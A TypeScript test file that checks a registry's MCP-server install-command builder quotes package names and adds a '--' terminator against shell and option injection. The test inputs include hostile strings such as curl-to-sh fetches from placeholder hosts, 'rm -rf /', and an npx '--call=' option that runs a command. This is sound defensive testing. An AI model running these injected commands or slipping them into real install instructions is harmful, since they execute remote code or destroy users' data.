import test from 'node:test';
import assert from 'node:assert/strict';
import { buildInstalls, shellArg } from './installs';
import type { IndexedServer } from './types';

function srv(over: Partial<IndexedServer>): IndexedServer {
  return {
    source: 'registry',
    slug: 'x',
    name: 'ns/x',
    title: 'X',
    description: 'd',
    version: '1.0.0',
    category: 'other',
    publishedAt: '2026-01-01T00:00:00Z',
    updatedAt: '2026-01-01T00:00:00Z',
    status: 'active',
    hasRemote: false,
    hasPackage: true,
    primaryTransport: 'stdio',
    envVars: [],
    ...over,
  };
}

test('ordinary identifiers render unquoted (no visual regression)', () => {
  for (const v of [
    '@modelcontextprotocol/server-filesystem',
    'mcp-server-git',
    'ghcr.io/apithreshold/apithreshold:0.1.0',
    'https://github.com/x/y/releases/download/v0.7/f.plugin',
    'pkg_name.v2+build-1',
  ]) {
    assert.equal(shellArg(v), v, `${v} should pass through untouched`);
  }
});

test('shell metacharacters are quoted, not passed through', () => {
  // Each of these would otherwise produce a runnable command on paste.
  const hostile: Array<[string, string]> = [
    ['x; curl evil.sh|sh', "'x; curl evil.sh|sh'"],
    ['x && rm -rf /', "'x && rm -rf /'"],
    ['x`whoami`', "'x`whoami`'"],
    ['x$(id)', "'x$(id)'"],
    ['x y', "'x y'"],
    ['x\nrm -rf /', "'x\nrm -rf /'"],
    ['x>out', "'x>out'"],
  ];
  for (const [raw, want] of hostile) assert.equal(shellArg(raw), want);
});

test('embedded single quotes are escaped POSIX-style', () => {
  // Naive quoting would let `'` close the quote and escape the sandbox.
  assert.equal(shellArg("a'b"), "'a'\\''b'");
  assert.equal(shellArg("'; rm -rf /; '"), "''\\''; rm -rf /; '\\'''");
});

test('a hostile npm identifier cannot produce a runnable command', () => {
  const out = buildInstalls(srv({ npmPackage: 'evil; curl http://x.sh | sh' }));
  const commands = out.filter((t) => t.command).map((t) => t.command!);
  assert.ok(commands.length >= 3, 'expected the three shell targets');
  for (const c of commands) {
    // The payload must be inside single quotes, so the shell treats it as one argument.
    assert.ok(
      c.includes("'evil; curl http://x.sh | sh'"),
      `unquoted payload in: ${c}`,
    );
    // And no bare metacharacter may sit outside quotes.
    const outsideQuotes = c.replace(/'[^']*'/g, '');
    assert.doesNotMatch(outsideQuotes, /[;&|`$><]/, `metacharacter escaped the quoting: ${c}`);
  }
});

test('the JSON config blocks pass the identifier as an argv element AFTER an option terminator', () => {
  const out = buildInstalls(srv({ npmPackage: 'evil; rm -rf /' }));
  const json = out.find((t) => t.json)!.json!;
  const parsed = JSON.parse(json);
  // No shell is involved here, so quoting is irrelevant - but npx still parses argv for
  // options, so the terminator is what makes an option-shaped identifier inert.
  assert.deepEqual(parsed.mcpServers.x.args, ['-y', '--', 'evil; rm -rf /']);
});

test('an option-shaped identifier cannot reach a runner as an option', () => {
  // `npx -y '--call=<cmd>'` EXECUTES <cmd>: quoting makes it one shell token, and npx then
  // parses that token as an option. Confirmed by running it. `--` is what actually stops it.
  const payload = '--call=curl http://evil.sh | sh';
  const out = buildInstalls(srv({ npmPackage: payload, pypiPackage: payload, dockerImage: payload }));
  for (const t of out.filter((x) => x.command)) {
    const idx = t.command!.indexOf(payload.slice(0, 8));
    assert.ok(idx > 0, `payload absent from: ${t.command}`);
    assert.ok(
      t.command!.slice(0, idx).includes(' -- '),
      `no option terminator before the payload: ${t.command}`,
    );
  }
  for (const t of out.filter((x) => x.json)) {
    const args: string[] = Object.values(JSON.parse(t.json!).mcpServers)[0] ? (Object.values(JSON.parse(t.json!).mcpServers)[0] as { args: string[] }).args : [];
    assert.ok(args.includes('--'), `argv lacks a terminator: ${JSON.stringify(args)}`);
    assert.ok(args.indexOf('--') < args.indexOf(payload), 'terminator must precede the payload');
  }
});

test('shortName never yields an empty or option-shaped token', () => {
  assert.equal(shortName_probe('ns/'), 'mcp-server');
  assert.equal(shortName_probe('ns/!!!'), 'mcp-server');
  assert.equal(shortName_probe('ns/--evil'), 'evil');
});

// shortName is module-private; exercise it through the rendered command.
function shortName_probe(name: string): string {
  const cmd = buildInstalls(srv({ name, npmPackage: 'pkg' })).find((t) => t.client === 'claude-code')!.command!;
  return cmd.replace('claude mcp add --scope user ', '').split(' ')[0];
}

test('the rendered command is exactly this literal (no recomputation)', () => {
  // Asserted against a hardcoded string on purpose. The previous version built its
  // expectation by calling shellArg(), so it would have passed even if shellArg were the
  // identity function - it tested nothing. Verified by hand:
  //   npx -y -- 'weird pkg'\''name'   ->  argv[3] === "weird pkg'name"
  const pkg = "weird pkg'name";
  const out = buildInstalls(srv({ npmPackage: pkg }));
  assert.equal(
    out.find((t) => t.client === 'cline')!.command,
    "npx -y -- 'weird pkg'\\''name'",
  );
});
